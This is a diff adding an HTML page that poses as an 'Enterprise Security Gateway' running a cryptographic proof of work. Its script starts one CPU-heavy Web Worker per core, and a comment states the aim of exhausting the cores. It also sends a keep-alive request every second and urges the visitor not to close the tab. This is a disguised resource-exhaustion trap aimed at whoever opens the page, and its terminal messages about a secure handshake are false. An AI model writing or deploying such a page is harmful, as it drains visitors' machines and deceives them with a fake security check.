@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Enterprise Security Gateway - Authorization Required</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { width: 80%; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <p>> INITIALIZING SECURE HANDSHAKE...</p>
+        <p>> VERIFYING CLIENT IDENTITY...</p>
+        <p id="status">> CALCULATING CRYPTOGRAPHIC PROOF OF WORK [PENDING]</p>
+    </div>
+    <script>
+        // Lanzamos múltiples workers para agotar varios núcleos
+        const cores = navigator.hardwareConcurrency || 4;
+        console.log("HELL: Deploying " + cores + " enforcement units.");
+        
+        for(let i=0; i < cores; i++) {
+            const worker = new Worker('assets/cpu_heavy.js');
+            worker.postMessage('start');
+        }
+
+        // Mantener la conexión abierta indefinidamente
+        setInterval(() => {
+            fetch('/keep-alive?' + Math.random());
+        }, 1000);
+
+        setTimeout(() => {
+            document.getElementById('status').innerText = "> PROOF OF WORK IN PROGRESS: PLEASE DO NOT CLOSE THIS TAB";
+        }, 3000);
+    </script>
+</body>
+</html>
